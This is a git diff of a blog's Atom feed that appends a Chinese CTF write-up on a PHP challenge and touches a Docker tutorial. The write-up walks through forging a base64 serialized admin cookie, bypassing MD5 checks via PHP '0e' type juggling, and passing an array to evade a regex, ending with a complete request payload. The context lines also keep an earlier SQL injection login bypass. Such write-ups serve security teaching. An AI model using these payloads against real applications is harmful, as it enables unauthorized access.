@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-11-25T06:16:20.187Z</updated>
+  <updated>2017-11-26T03:32:20.940Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html"/>
     <id>http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</id>
     <published>2017-11-25T03:41:12.000Z</published>
-    <updated>2017-11-25T06:16:20.187Z</updated>
+    <updated>2017-11-26T03:32:20.940Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <h2 id="火星文-50"><a href="#火星文-50" class="headerlink" title="火星文 50"></a>火星文 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="external">http://47.100.121.220:28001/</a></p>
@@ -110,7 +110,63 @@
 </ol>
 <p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username:&apos; and 0=1 union select md5(1)#</div><div class="line">password:1</div></pre></td></tr></table></figure></p>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/sqlsql.png" alt=""></p>
-<h2 id="You-have-no-permissions-150"><a href="#You-have-no-permissions-150" class="headerlink" title="You have no permissions 150"></a>You have no permissions 150</h2>]]></content>
+<h2 id="You-have-no-permissions-150"><a href="#You-have-no-permissions-150" class="headerlink" title="You have no permissions 150"></a>You have no permissions 150</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="external">http://47.100.121.220:28003/03.php</a></p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>implode() 函数</p>
+<p>implode() 函数返回由数组元素组合成的字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">implode(separator,array)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>separator</td>
+<td style="text-align:center">可选。规定数组元素之间放置的内容。默认是 “”（空字符串）。</td>
+</tr>
+<tr>
+<td>array</td>
+<td style="text-align:center">必需。要组合为字符串的数组。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是绕了一点弯的，周六我做这个题是一点思路没有的</p>
+<p>今天重新看了这个题，数据包里只有一个role的cookies。</p>
+<p>经过一顿操作，发现这个是base64加密的，解密得到s:5:”guest”;</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/guest.png" alt=""></p>
+<p>s:5:”guest”,看起来像一个序列化后的数据，这里我们把guest改成admin试试，admin的长度也是5</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/adminbase64.png" alt=""></p>
+<p>得到了czo1OiJhZG1pbiI7，替换cookie传入，进入终于有权限了。得到一份源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$role = &quot;guest&quot;;</div><div class="line">$flag = &quot;flag&#123;xxxxxx&#125;&quot;;</div><div class="line">$auth = false;</div><div class="line">if(isset($_COOKIE[&quot;role&quot;])) &#123;</div><div class="line">    if(&quot;admin&quot;===unserialize(base64_decode($_COOKIE[&quot;role&quot;])))</div><div class="line">    &#123;</div><div class="line">        $auth = true;</div><div class="line">        echo &quot;Hello admin, now you can upload something you are easy to forget.&lt;/br&gt;&quot;;</div><div class="line">        echo &quot;there are ther source.&lt;/br&gt;&quot;;</div><div class="line">        </div><div class="line">        if(isset($_POST[&quot;key1&quot;])) &#123;</div><div class="line">            $key1 = $_POST[&quot;key1&quot;];</div><div class="line">            $md51 = @md5($key1);</div><div class="line">            $md52 = @md5(&apos;s155964671a&apos;);</div><div class="line">            if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52) &#123;</div><div class="line">                if(isset($_POST[&quot;data&quot;])) &#123;</div><div class="line">                    $data = $_POST[&quot;data&quot;];</div><div class="line">                    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</div><div class="line">                    $s = implode(&quot;&quot;,$data);</div><div class="line">                    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</div><div class="line">                    </div><div class="line">                    if(!$b1 &amp;&amp; $b2 ) die($flag);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        $myfile = fopen(&quot;03.php&quot;, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</div><div class="line">        $text = fread($myfile,filesize(&quot;03.php&quot;));</div><div class="line">        fclose($myfile);</div><div class="line">        $text = str_replace(&quot;xxxxxx&quot;,&quot;xxxxxx&quot;,$text);</div><div class="line">        echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;40&quot; style=&quot;resize:none&quot; &gt;&apos;;</div><div class="line">        echo $text;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(!$auth) &#123;</div><div class="line">    setcookie(&quot;role&quot;,&quot;czo1OiJndWVzdCI7&quot;);</div><div class="line">    echo &quot;Sory.You have no permissions.&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>分析代码，先看MD5这一块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&quot;key1&quot;])) &#123;</div><div class="line">    $key1 = $_POST[&quot;key1&quot;];</div><div class="line">    $md51 = @md5($key1);</div><div class="line">    $md52 = @md5(&apos;s155964671a&apos;);</div><div class="line">    if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52)</div></pre></td></tr></table></figure>
+<p>这里是利用PHP语言的弱类型特征：</p>
+<ul>
+<li>1）将s155964671a进行MD5加密，密文为0e342768416822451524974117254469，发现密文为0e开头，PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。 </li>
+<li>2）因为0exx都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可 </li>
+<li>3）相关字符串：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">md5(&apos;s878926199a&apos;)=0e545993274517709034328855841020</div><div class="line">md5(&apos;QNKCDZO&apos;)=0e342768416822451524974117254469</div></pre></td></tr></table></figure>
+<p>这里我们就可以构造一个key变量，key的传入值为QNKCDZO或者s878926199a</p>
+<p>继续看后面的代码，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&quot;data&quot;])) &#123;</div><div class="line">    $data = $_POST[&quot;data&quot;];</div><div class="line">    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</div><div class="line">    $s = implode(&quot;&quot;,$data);</div><div class="line">    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</div><div class="line">    </div><div class="line">    if(!$b1 &amp;&amp; $b2 ) die($flag);</div></pre></td></tr></table></figure>
+<p>impode函数是把数组的元素组成字符串的，如注释\$b1需要返回0，\$b2需要返回1.</p>
+<p>简单的做了个测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = array(&quot;/[&lt;&gt;?]/&quot;); </div><div class="line">if($item = preg_match(&quot;/[&lt;&gt;?]/&quot;,$data))&#123;</div><div class="line"> echo &apos;1&lt;hr /&gt;&apos;; </div><div class="line">&#125;else &#123; </div><div class="line"> echo &apos;0&lt;hr /&gt;&apos;; </div><div class="line">&#125; </div><div class="line"></div><div class="line">$s = implode(&quot;&quot;,$data);</div><div class="line">echo $s ;</div><div class="line">echo &apos;&lt;hr /&gt;&apos;;</div><div class="line">if($b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s))</div><div class="line">&#123;</div><div class="line">	</div><div class="line"> echo &apos;1&lt;hr /&gt;&apos;; </div><div class="line">&#125;else &#123; </div><div class="line"> echo &apos;0&lt;hr /&gt;&apos;; </div><div class="line">&#125; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/tesrceshi.png" alt=""></p>
+<p>可以看出来，传入一个[&lt;&gt;?]是可以直接得到我们想要的返回值的。但是直接传data=[&lt;&gt;?]是不行的</p>
+<p>这里我们可以这样传入 data[]=[&lt;&gt;?] 当做一个数组传入，符合了代码的意思</p>
+<p>再做一个简单的测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">var_dump( $_POST[&quot;a&quot;]);</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">print_r( $_POST[&quot;a&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/shuzuceshi.png" alt=""></p>
+<p>这里我们可以看出我们这样传参就是传入了一个数组了。</p>
+<p>最后的payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Cookie: role=czo1OiJhZG1pbiI7</div><div class="line"></div><div class="line">POST:</div><div class="line">key1=s878926199a&amp;data[]=[&lt;&gt;?]</div></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/flag11111111.png" alt=""></p>
+]]></content>
     
     <summary type="html">
     
@@ -838,7 +894,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#102;&#x6f;&#x6f;&#64;&#x62;&#x61;&#x72;&#46;&#x63;&#x6f;&#x6d;">&#102;&#x6f;&#x6f;&#64;&#x62;&#x61;&#x72;&#46;&#x63;&#x6f;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#102;&#x6f;&#111;&#64;&#98;&#x61;&#114;&#46;&#x63;&#111;&#109;">&#102;&#x6f;&#111;&#64;&#98;&#x61;&#114;&#46;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
